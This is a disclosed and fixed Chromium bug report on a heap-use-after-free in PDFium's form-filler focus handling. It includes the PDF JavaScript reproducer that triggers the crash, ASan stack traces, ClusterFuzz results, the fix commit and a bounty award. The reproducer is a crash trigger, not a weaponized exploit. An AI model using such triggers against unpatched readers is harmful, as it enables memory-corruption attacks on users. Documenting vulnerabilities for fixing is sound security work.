# Security: Heap-use-after-free in CFFL_InteractiveFormFiller::OnSetFocus 

| Field | Value |
|-------|-------|
| **Issue ID** | [40085493](https://issues.chromium.org/issues/40085493) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ch...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2016-09-23 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**

Bug is in below mentioned code section of CFFL\_InteractiveFormFiller::OnSetFocus method.

....  

pWidget->OnAAction(CPDF\_AAction::GetFocus, fa, pPageView);  

m\_bNotifying = FALSE;

if (pWidget->IsAppModified()) {  

.....

pWidget can be deleted through "pWidget->OnAAction"

\* Another common cause for this bug and bugs 632709,630654 is mentioned in <https://crbug.com/chromium/649659#c16> of <https://crbug.com/chromium/632709>. I think it is better to fix that too since that pattern can be used to find new bugs.

Attached test.pdf file contains below mentioned Javascript.

## Document Javascript section

function test()  

{  

f = this.getField('cmb1');  

f.value ='one';  

f.setFocus();  

}

app.setTimeOut('test()',4000);

## onFocus event of "cmb1" Combo Box

n = this.pageNum;

**VERSION**  

Chrome Version: [53.0.2785.116 ] + [stable]  

[55.0.2869.0] + [Tot]  

**Operating System: [Please indicate OS, version, and service pack level]**

**REPRODUCTION CASE**

1. Open attached test.pdf with chrome.
2. Wait 4 seconds.  
   
   PDF Plugin process will crash.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [PDF Plugin process]  

Crash State: Address Sanitizer output

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x607000012580 at pc 0x55c0fffd9b8e bp 0x7ffc4ca27140 sp 0x7ffc4ca27138  

READ of size 4 at 0x607000012580 thread T0 (chrome)  

#0 0x55c0fffd9b8d in ?? ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_widget.cpp:743:10  

#1 0x55c10002b289 in OnSetFocus ./out/asan/../../third\_party/pdfium/fpdfsdk/formfiller/cffl\_interactiveformfiller.cpp:442:20  

#2 0x55c0ffff4dfe in Annot\_OnSetFocus ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_annothandlermgr.cpp:225:33  

#3 0x55c0fffcb50b in SetFocusAnnot ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:206:27  

#4 0x55c10046f174 in setFocus ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/Field.cpp:3225:18  

#5 0x55c10048c373 in JSMethod<Field, &Field::setFocus> ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/JS\_Define.h:155:8  

#6 0x55c0f1d520d9 in Call ./out/asan/../../v8/src/api-arguments.cc:19:3  

#7 0x55c0f1ec5e08 in HandleApiCallHelper<false> ./out/asan/../../v8/src/builtins/builtins-api.cc:106:36  

#8 0x55c0f1ec359e in Builtin\_Impl\_HandleApiCall ./out/asan/../../v8/src/builtins/builtins-api.cc:135:5  

#9 0x7f456af843a6 (<unknown module>)  

#10 0x7f456b084afd (<unknown module>)  

#11 0x7f456b084913 (<unknown module>)  

#12 0x7f456afcf7a2 (<unknown module>)  

#13 0x7f456afaaa60 (<unknown module>)  

#9 0x55c0f27c6f0f in Invoke ./out/asan/../../v8/src/execution.cc:139:13  

#10 0x55c0f27c6452 in Call ./out/asan/../../v8/src/execution.cc:176:10  

#11 0x55c0f1d6ae1b in Run ./out/asan/../../v8/src/api.cc:1864:7  

#12 0x55c1004d1faa in Execute ./out/asan/../../third\_party/pdfium/fxjs/fxjs\_v8.cpp:477:25  

#13 0x55c10040081c in ?? ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/cjs\_runtime.cpp:241:14  

#14 0x55c1004cca7a in RunScript ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/cjs\_context.cpp:52:24  

#15 0x55c1004b90a6 in RunJsScript ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/app.cpp:615:15  

#16 0x55c1004b90a6 in TimerProc ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/app.cpp:603:0  

#17 0x55c1004b8437 in Trigger ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/app.cpp:103:26  

#18 0x55c0f5bc479c in OnCallback  

.......

0x607000012580 is located 64 bytes inside of 80-byte region [0x607000012540,0x607000012590)  

freed by thread T0 (chrome) here:  

#0 0x55c0f122f05b in operator delete(void\*) ??:?  

#1 0x55c0fffd5456 in ~CPDFSDK\_PageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_pageview.cpp:67:23  

#2 0x55c0fffcb0fe in RemovePageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:153:3  

#3 0x55c0f5bd62f2 in Unload ./out/asan/../../pdf/pdfium/pdfium\_page.cc:111:7  

#4 0x55c0f5baa3ba in CalculateVisiblePages ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2650:20  

#5 0x55c0f5bc411d in GetMostVisiblePage ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2290:3  

#6 0x55c0f5ba6c94 in Form\_GetCurrentPage ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:3502:21  

#7 0x55c0fffca66f in ?? ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:69:38  

#8 0x55c10042a83c in pageNum ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/Document.cpp:219:52  

#9 0x55c10043e53e in JSPropGetter<Document, &Document::pageNum> ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/JS\_Define.h:89:8  

#10 0x55c0f2a12818 in Call ./out/asan/../../v8/src/api-arguments-inl.h:32:1  

#11 0x55c0f2b7c555 in GetPropertyWithAccessor ./out/asan/../../v8/src/objects.cc:1350:34  

#12 0x55c0f2b79fba in GetProperty ./out/asan/../../v8/src/objects.cc:996:16  

#13 0x55c0f29d43d5 in Load ./out/asan/../../v8/src/ic/ic.cc:643:5  

#14 0x55c0f29ec9c4 in \_\_RT\_impl\_Runtime\_LoadIC\_Miss ./out/asan/../../v8/src/ic/ic.cc:2285:5  

#15 0x55c0f29ec9c4 in Runtime\_LoadIC\_Miss ./out/asan/../../v8/src/ic/ic.cc:2267:0  

#15 0x7f456af843a6 (<unknown module>)  

#16 0x7f456b084c0e (<unknown module>)  

#17 0x7f456afcf7a2 (<unknown module>)  

#18 0x7f456afaaa60 (<unknown module>)  

#16 0x55c0f27c6f0f in Invoke ./out/asan/../../v8/src/execution.cc:139:13  

#17 0x55c0f27c6452 in Call ./out/asan/../../v8/src/execution.cc:176:10  

#18 0x55c0f1d6ae1b in Run ./out/asan/../../v8/src/api.cc:1864:7  

#19 0x55c1004d1faa in Execute ./out/asan/../../third\_party/pdfium/fxjs/fxjs\_v8.cpp:477:25  

#20 0x55c10040081c in ?? ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/cjs\_runtime.cpp:241:14  

#21 0x55c1004cca7a in RunScript ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/cjs\_context.cpp:52:24  

#22 0x55c0fffc7607 in ?? ./out/asan/../../third\_party/pdfium/fpdfsdk/fsdk\_actionhandler.cpp:522:28  

#23 0x55c0fffc849d in ExecuteFieldAction ./out/asan/../../third\_party/pdfium/fpdfsdk/fsdk\_actionhandler.cpp:249:9  

#24 0x55c0fffc8120 in DoAction\_Field ./out/asan/../../third\_party/pdfium/fpdfsdk/fsdk\_actionhandler.cpp:105:10  

#25 0x55c0fffed631 in OnAAction ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_widget.cpp:1896:28  

#26 0x55c10002b265 in OnSetFocus ./out/asan/../../third\_party/pdfium/fpdfsdk/formfiller/cffl\_interactiveformfiller.cpp:439:16

previously allocated by thread T0 (chrome) here:  

#0 0x55c0f122e41b in operator new(unsigned long) ??:?  

#1 0x55c100000c2a in NewAnnot ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_widgethandler.cpp:64:29  

#2 0x55c0fffd7361 in LoadFXAnnots ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_pageview.cpp:502:47  

#3 0x55c0fffca0bf in GetPageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:63:14  

#4 0x55c0fffbd953 in FormHandleToPageView ./out/asan/../../third\_party/pdfium/fpdfsdk/fpdfformfill.cpp:56:29  

#5 0x55c0fffbd953 in FORM\_OnAfterLoadPage ./out/asan/../../third\_party/pdfium/fpdfsdk/fpdfformfill.cpp:649:0  

#6 0x55c0f5bd6542 in GetPage ./out/asan/../../pdf/pdfium/pdfium\_page.cc:126:7  

#7 0x55c0fffca6fb in GetPageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:75:38  

#8 0x55c0fffce21f in GetWidget ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_interform.cpp:112:28  

#9 0x55c0fffce732 in GetWidgets ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_interform.cpp:137:31  

#10 0x55c100456dfd in UpdateFormField ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/Field.cpp:296:17  

#11 0x55c10046b409 in SetValue ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/Field.cpp:2778:11  

#12 0x55c10046a801 in value ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/Field.cpp:2674:7  

#13 0x55c100484165 in JSPropSetter<Field, &Field::value> ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/JS\_Define.h:114:8  

#14 0x55c0f2a11d42 in Call ./out/asan/../../v8/src/api-arguments-inl.h:131:3  

#15 0x55c0f2b83b8b in SetPropertyWithAccessor ./out/asan/../../v8/src/objects.cc:1433:10  

#16 0x55c0f2bba338 in SetPropertyInternal ./out/asan/../../v8/src/objects.cc:4677:16  

#17 0x55c0f2bb9450 in SetProperty ./out/asan/../../v8/src/objects.cc:4709:9  

#18 0x55c0f29e1a89 in Store ./out/asan/../../v8/src/ic/ic.cc:1580:3  

.............

## Attachments

- [test.pdf](attachments/test.pdf) (application/pdf, 2.9 KB)

## Timeline

### el...@chromium.org (2016-09-23)

dsinclair@ please take a look.

[Monorail components: Internals>Plugins>PDF]

### cl...@chromium.org (2016-09-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5080879284355072

### th...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-09-24)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5080879284355072

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60d000026700
Crash State:
  CPDFSDK_Widget::IsAppModified
  CFFL_InteractiveFormFiller::OnSetFocus
  CPDFSDK_AnnotHandlerMgr::Annot_OnSetFocus
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=271393:271739

Minimized Testcase (2.85 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94QAvxHkfZTDyALUmBisXnw-U_1Icp1JuUH9ib4V4VEaRAW9jjW7FjjpEBAGiwikavqOT4BgbUMnBn2zjETl-8-hR7IN7gngAym7ySaG0EDy7BN9V_n9u1YWYAv6uS8MTU7WDeCelFZofldoAFqa11Vk8lT9Q?testcase_id=5080879284355072

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### sh...@chromium.org (2016-09-24)

[Empty comment from Monorail migration]

### ts...@chromium.org (2016-09-27)

CL at https://codereview.chromium.org/2368403002/

### ts...@chromium.org (2016-09-27)

https://pdfium.googlesource.com/pdfium/+/f8074cefb2f8d947fa83d151bcbe080b485d6e6b

### aw...@chromium.org (2016-09-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-28)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-09-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/003ad06e73a1c71b42b867c4be927ed4d9c06ed7

commit 003ad06e73a1c71b42b867c4be927ed4d9c06ed7
Author: pdfium-deps-roller <pdfium-deps-roller@chromium.org>
Date: Tue Sep 27 23:07:33 2016

Roll src/third_party/pdfium/ ec7a9455c..84144e88d (2 commits).

https://pdfium.googlesource.com/pdfium.git/+log/ec7a9455c15b..84144e88da8d

$ git log ec7a9455c..84144e88d --date=short --no-merges --format='%ad %ae %s'
2016-09-27 thestig Simplify FPDF_RenderPage().
2016-09-27 tsepez Watch destruction of widgets around OnAAction() method.

BUG=649659

TBR=dsinclair@chromium.org

Review-Url: https://codereview.chromium.org/2371833006
Cr-Commit-Position: refs/heads/master@{#421378}

[modify] https://crrev.com/003ad06e73a1c71b42b867c4be927ed4d9c06ed7/DEPS


### cl...@chromium.org (2016-09-29)

ClusterFuzz has detected this issue as fixed in range 421240:421437.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5080879284355072

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60d000026700
Crash State:
  CPDFSDK_Widget::IsAppModified
  CFFL_InteractiveFormFiller::OnSetFocus
  CPDFSDK_AnnotHandlerMgr::Annot_OnSetFocus
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=271393:271739
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=421240:421437

Minimized Testcase (2.85 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94QAvxHkfZTDyALUmBisXnw-U_1Icp1JuUH9ib4V4VEaRAW9jjW7FjjpEBAGiwikavqOT4BgbUMnBn2zjETl-8-hR7IN7gngAym7ySaG0EDy7BN9V_n9u1YWYAv6uS8MTU7WDeCelFZofldoAFqa11Vk8lT9Q?testcase_id=5080879284355072

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

The panel decided to award $3,000 for this bug - congratulations!

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-04)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2017-01-04)

This issue was migrated from crbug.com/chromium/649659?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085493)*
